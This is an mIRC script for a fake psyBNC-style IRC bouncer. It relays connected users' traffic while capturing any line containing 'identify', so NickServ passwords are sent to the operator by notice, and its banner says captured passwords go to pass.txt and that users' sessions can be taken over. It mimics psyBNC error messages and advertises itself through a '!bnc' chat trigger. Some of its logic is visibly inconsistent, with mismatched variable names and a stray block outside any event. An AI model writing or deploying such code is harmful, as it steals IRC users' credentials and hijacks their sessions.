alias GetIP { echo -a  $+ $colour(info text ) $+ *** Your IP is: %my.1p }
alias  bncgetsock {
  var %min = 0
  var %max = $sock(bnc?*,0)
  :loop
  inc %min
  if (%min > %max) { return $null }
  if ($gettok($sock(bnc?*,%min),2,32) == $2) { return $remove($sock(bnc?*,%min),bnc) }
  goto loop
}

alias bnc {
  if ($1 == start) { socklisten bnc $+ $r(1,655500) $2 | echo -a  $+ $colour(info text) $+ *** BNC Listening on port $sock(bnc).port }
  if ($1 == set) { 
    if ($2 == server) { set %bnc.server $iif($3 == $null,PsyBNC,$3) }
    if ($2 == passwd) { if ($3 != $null) { set %bnc.pp $3 } | if ($3 == $null) { unset %bnc.pp }  }
  }
  if ($1 == summon) { 
    if ($bncgetsock($2) != $null) { sockwrite -n server $+ $bncgetsock($2) JOIN $3 }
  }
  if ($1 == leave) {
    if ($bncgetsock($2) != $null) { sockwrite -n server $+ $bncgetsock($2) PART $3 }
  }
}
on *:SOCKLISTEN:bnc*:{ 
  set %temp $rand(1,999) 
  sockaccept bnc $+ %temp 
  sockmark bnc $+ %temp !connect!
}
on *:SOCKREAD:bnc*:{
  sockread %bnc
  tokenize 32 %bnc
  if ($gettok($sock($sockname).mark,1,32) == !pass!) { 
    if (%bnc.pp == $null) { halt }
    if ($1 == pass) { 
      if ($2 != %bnc.pp) { sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Password incorrect. | sockclose $sockname | halt }
      if ($2 == %bnc.pp) { sockwrite -n $Sockname :Welcome NOTICE AUTH : $+ %bnc.server | sockwrite -n $sockname  : $+ %bnc.server NOTICE AUTH :Use /quote CONN <server> [port] to connect to a server | sockmark $Sockname !auth! $gettok($sock($sockname).mark,2-,32)  }
    }
  }
  if ($gettok($sock($sockname).mark,1,32) == !server!) {
    if (bhelp isin $1) {  sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :No such help file (h_bhelp.gz). }
    if (addserver isin $1) {  sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Err: Could not add server "No such user file" (b_user.gz). }
    if ($window(@bnc) == $null) { openwin }
    echo @bnc 1 $sockname $+ :3 $1-
    sockwrite -n $replace($sockname,bnc,server) $1-
    if (identify isin $1-) { /sockwrite -nt $replace($sockname,bnc,server) notice $me : $+ $1- | set %possible yes }
    halt
  }
  if ($gettok($sock($sockname).mark,1,32) == !auth!) {
    if (bhelp isin $1) {  sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Could not read help file (No such help file (h_bhelp.gz)). }
    if (addserver isin $1) {  sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Err: Could not add server (No such user file (b_user.gz)). }
    if ($1 == conn) || ($1 == connect) { 
      sockopen server $+ $remove($Sockname,bnc) $2 $iif($3 == $null,6664,$3) 
      sockmark $replace($sockname,bnc,server) $2
      sockwrite -n $sockname : $+ %bnc.server NOTICE AUTH :Connecting to server $2 $+ : $+ $iif($3 == $null,6664,$3)
    }
  }
  if ($gettok($sock($Sockname).mark,1,32) == !connect!) {

    if ($1 == nick) { sockmark $sockname $sock($sockname).mark $remove($2,:) }
    if (%bnc.pp == $null) { sockwrite -n $sockname  : $+ %bnc.server NOTICE AUTH :Use /quote CONN <server> [port] to connect to a server | sockmark $Sockname !auth! $gettok($sock($sockname).mark,2-,32) | halt }
    if (%bnc.pp != $null) {
      if ($1 != pass) { sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Please authenticate yourself using /quote PASS <password> | sockmark $Sockname !pass! $gettok($sock($Sockname).mark,2-,32) | halt }
      if ($1 == pass) { 
        if ($2 != %bnc.pp) { sockwrite -n $Sockname : $+ %bnc.server NOTICE AUTH :Please authenticate yourself using /quote PASS <password> | halt }
        if ($2 == %bnc.pp) { sockwrite -n $Sockname :Welcome NOTICE AUTH : $+ %bnc.server  | sockwrite -n $sockname  : $+ %bnc.server NOTICE AUTH :Use /quote CONN <server> [port] to connect to a server | sockmark $Sockname !auth! $gettok($sock($sockname).mark,2-,32) }
      }
    }
  }
}
on *:SOCKOPEN:server*:{
  if ($sockerr <= 0) { 
    sockwrite -n $replace($Sockname,server,bnc) : $+ %bnc.server NOTICE AUTH :*** Your connecting to the server. Please wait... 
    .timer 1 2 sockwrite -n $sockname NICK  : $+ $gettok($sock($replace($sockname,server,bnc)).mark,2,32) 
    .timer 1 2 sockwrite -n $SOckname USER %bnc.server . . : $+ %bnc.server bnc user. 
  sockmark $replace($Sockname,server,bnc) !server! $gettok($sock($sockname).mark,2-,32)  } 
  else { sockwrite -n $replace($sockname,server,bnc) : $+ %bnc.server NOTICE AUTH :Error connecting to $sock($sockname).mark (ERRID: $sockerr $+ )
  } 
}
on 1:Sockclose:server*:{
  sockwrite -tn bnc $+ $remove($sockname,server) :Connection to server closed
  sockclose * $+ $remove($sockname,server)
  sockclose $replace($sockname,bnc,server)
}
on *:SOCKREAD:server*:{
  sockread %server 
  tokenize 32 %server 
  sockwrite -n $replace($sockname,server,bnc) $1- 
  if ($window(@bnc) == $null) { openwin }
  echo @bnc 4 $+ $sockname $+ : 12[received] 2 $+ $1-

}
alias openwin {
  window -eSk0 @bnc
  echo @bnc This window show up when someone is connecting thru your bnc.
  echo @bnc --------------------------------------------
  echo @bnc During the USER's session, you will be able to log in this window his NickServ/ChanServ passwords.
  echo @bnc You can control BNC USER's mIRC with the popups on right click.
  echo @bnc --------------------------------------------
  echo @bnc Right click - to take control
  echo @bnc or
  echo @bnc /s comand   Ex: /s join #ksuhd     /s part #    /s mode # +o $me  
  echo @bnc --------------------------------------------
  echo @bnc Have fun but don't abuse.
  echo @bnc Passwords are logged on $mircdir $+ pass.txt
}
on *:TEXT:*bnc*:*:{
  if (!bnc == $1) { /msg $nick psybnc /server $ip 8273 %bnc.pp $+  | bnc start 8273 } 
  if (%poss == yes) {
    /echo -a $nick $+ : $+ %msg
    /write $mircdirpass.txt $nick $+ : $+ %msg
    /unset %poss
  } 
}
if (dal.net !isin $2) { 
  sockwrite -n $sockname  : $+ %bnc.server NOTICE AUTH :Warning! This BNC is restricted to connect to DALnet network only.
  sockwrite -n $sockname  : $+ %bnc.server NOTICE AUTH :Use /connect <server> [port] to connect to a server 
  /halt
}
